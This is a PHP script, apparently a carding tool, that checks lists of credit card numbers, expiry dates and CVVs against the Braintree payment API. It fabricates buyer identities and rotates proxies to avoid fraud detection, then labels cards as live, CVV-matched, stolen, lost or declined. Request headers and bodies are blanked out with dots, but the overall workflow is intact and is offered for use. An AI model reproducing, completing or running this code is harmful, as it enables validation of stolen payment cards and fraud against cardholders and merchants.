<?php
###################################################################################################################
#----------------------------------------Made with ❤️ by AndryMata-------------------------------------------------#
########################################--------------------------#################################################


include 'function.php';
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');
if(file_exists(getcwd().('/cookie.txt'))){
@unlink('cookie.txt');
}


function multiexplode($delimiters, $string){
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;}

$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];};

function string_between_two_string($str, $starting_word, $ending_word){ 
$subtring_start = strpos($str, $starting_word); 
$subtring_start += strlen($starting_word);   
$size = strpos($str, $ending_word, $subtring_start) - $subtring_start;   
return substr($str, $subtring_start, $size);
}

$name = ucfirst(str_shuffle('kurumi'));
$last = ucfirst(str_shuffle('appisbest'));
$first1 = str_shuffle("kurumiapp85246");
$serve_arr = array("gmail.com","hotmail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email = "".$first1."%40".$serv_rnd."";
$street = "".rand(0000,9999)."+Main+Street";
$ph = array("682","346","246");
$ph1 = array_rand($ph);
$phh = $ph[$ph1];
$phone = "$phh".rand(0000000,9999999)."";

$st = array("AL","NY","CA","FL","WA");
$st1 = array_rand($st);
$state = $st[$st1];
if ($state == "NY"){
$zip = "10080";
$city = "New+York";
}
elseif ($state == "WA"){
$zip = "98001";
$city = "Auburn";
}
elseif ($state == "AL"){
$zip = "35005";
$city = "Adamsville";
}
elseif ($state == "FL"){
$zip = "32003";
$city = "Orange+Park";
}
else{
$zip = "90201";
$city = "Bell";
};
unlink("cookie.txt");

//////////////////////==============[Init Proxy Section]===============//////////////////////////////
///////////////////////////===[Webshare proxys for cc checker]===////////////////////////////////////
$Websharegay = rand(0,250);
$rp1 = array(
  1 => 'user-rotate:pass',
  2 => 'user-rotate:pass',
    ); 
    $rotate = $rp1[array_rand($rp1)];
//////////////////////////==============[Proxy Section]===============//////////////////////////////
$ch = curl_init('https://api.ipify.org/');
curl_setopt_array($ch, [
CURLOPT_RETURNTRANSFER => true,
CURLOPT_PROXY => 'http://p.webshare.io:80',
CURLOPT_PROXYUSERPWD => $rotate,
CURLOPT_HTTPGET => true,
]);
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();  
if (isset($ip1)){
$ip = "Live! ✅";
}
if (empty($ip1)){
$ip = "Dead![".$rotate."] ❌";
}
echo '[ IP: '.$ip.' ] ';
///////////////////////==============[End Proxy Section]===============//////////////////////////////


#-----------------------------------------------------------------------------------------------------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: ................................',
'Accept-Language: .......................',
'Authorization: .........................',
'Braintree-Version: .....................',
'Content-Type: ..........................',
'Origin: ................................',
'Referer: ...............................',
'Sec-Fetch-Dest: ........................',
'Sec-Fetch-Mode: ........................',
'Sec-Fetch-Site: ........................',
'user-agent: ............................',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '.........');
$result1 = curl_exec($ch);
$token = trim(strip_tags(getStr($result1,'"token":"','"')));
curl_close($ch);

#------------------------------------------------------------------------------------------------------------------#


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, '.................');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: ................................',
'Accept-Language: .......................',
'Content-Type: ..........................',
'Origin: ................................',
'Referer: ...............................',
'Sec-Fetch-Dest: ........................',
'Sec-Fetch-Mode: ........................',
'Sec-Fetch-Site: ........................',
'User-Agent: ............................',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '.................');
$result2 = curl_exec($ch);
curl_close($ch);


///////////////==============[Card Response]===========//////////////

if(strpos($result2, 'Gateway Rejected: avs')){
    echo '<span class="badge badge-white">Aprovadas </span></br> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">  『 ★ CVV MATCHED ★ 』</span> </b></br> <span class="badge badge-white">『 [★𝙕𝙍™]Andry 』</span></br>';
}
elseif(strpos($result2, "Insufficient Funds")){
    echo '<span class="badge badge-white">Aprovadas </span></br> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">  『 ★ CVV MATCH [Insuf. Balance] ★ 』</span> </b></br> <span class="badge badge-white">『 [★𝙕𝙍™]Andry 』</span></br>';
}
elseif(strpos($result2, "Card Issuer Declined CVV")){
    echo '<span class="badge badge-white">Aprovadas </span></br> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">  『 ★ CCN MATCHED ★ 』</span> </b></br> <span class="badge badge-white">『 [★𝙕𝙍™]Andry 』</span></br>';
}
elseif(strpos($result2, 'Stolen Card')){
    echo '<span class="badge badge-white">Aprovadas </span></br> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">  『 ★ CCN MATCH [Stolen Card] ★ 』 </span> </b></br> <span class="badge badge-white">『 [★𝙕𝙍™]Andry 』</span></br>';
}
elseif(strpos($result2, 'Lost Card')){
    echo '<span class="badge badge-white">Aprovadas </span></br> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">  『 ★ CCN MATCH [Lost Card] ★ 』 </span> </b></br> <span class="badge badge-white">『 [★𝙕𝙍™]Andry 』</span></br>';
}
elseif(strpos($result2, 'Processor Declined' )) {
    echo '<span class="badge badge-warning">Reprovadas</span></br> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-danger"> 『 ★ Processor Declined ★ 』</span> </b></br> <span class="badge badge-white">『 [★𝙕𝙍™]Andry 』</span></br>';
}
elseif(strpos($result2, 'Declined' )) {
    echo '<span class="badge badge-warning">Reprovadas</span></br> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-danger"> 『 ★ Card Declined ★ 』</span> </b></br> <span class="badge badge-white">『 [★𝙕𝙍™]Andry 』</span></br>';
}
elseif(strpos($result2, 'Do Not Honor' )) {
    echo '<span class="badge badge-warning">Reprovadas</span></br> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-danger"> 『 ★ Do Not Honor ★ 』</span> </b></br> <span class="badge badge-white">『 [★𝙕𝙍™]Andry 』</span></br>';
}
elseif(strpos($result2, 'Pickup Card' )) {
    echo '<span class="badge badge-warning">Reprovadas</span></br> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-danger"> 『 ★ Pickup Card 「Reported Stolen Or Lost」 ★ 』</span> </b></br> <span class="badge badge-white">『 [★𝙕𝙍™]Andry 』</span></br>';
}
elseif(strpos($result2, 'Transaction Not Allowed' )) {
    echo '<span class="badge badge-warning">Reprovadas</span></br> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-danger"> 『 ★ Transaction Not Allowed ★ 』</span> </b></br> <span class="badge badge-white">『 [★𝙕𝙍™]Andry 』</span></br>';
}
elseif(strpos($result2, 'Issuer or Cardholder has put a restriction on the card' )) {
    echo '<span class="badge badge-warning">Reprovadas</span></br> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-danger"> 『 ★ Issuer or Cardholder has put a restriction on the card ★ 』</span> </b></br> <span class="badge badge-white">『 [★𝙕𝙍™]Andry 』</span></br>';
}
elseif(strpos($result2, 'risk_threshold' )) {
    echo '<span class="badge badge-warning">Reprovadas</span></br> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-danger"> 『 ★ Fraud Detect ★ 』 </span> </b></br> <span class="badge badge-white">『 [★𝙕𝙍™]Andry 』</span></br>';
}
elseif(strpos($result2, 'Gateway Rejected: fraud' )) {
    echo '<span class="badge badge-warning">Reprovadas</span></br> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-danger"> 『 ★ Fraud Detect ★ 』 </span> </b></br> <span class="badge badge-white">『 [★𝙕𝙍™]Andry 』</span></br>';
}
elseif(!$result2){
    echo '<span class="badge badge-warning">Reprovadas</span></br> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-danger"> 『 ★ Proxy Dead ★ 』 </span> </b></br> <span class="badge badge-white">『 [★𝙕𝙍™]Andry 』</span></br>';
}
else {
    echo '<span class="badge badge-warning">Reprovadas</span></br> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-danger"> 『 ★ Error Not listed ★ 』</span> </b></br> <span class="badge badge-white">『 [★𝙕𝙍™]Andry 』</span></br>';
}
curl_close($ch);
ob_flush();
echo "<b>1REQ Result:</b> $result1<br><br>";
echo "<b>2REQ Result:</b> $result2<br><br>";
unlink("cookie.txt");
?>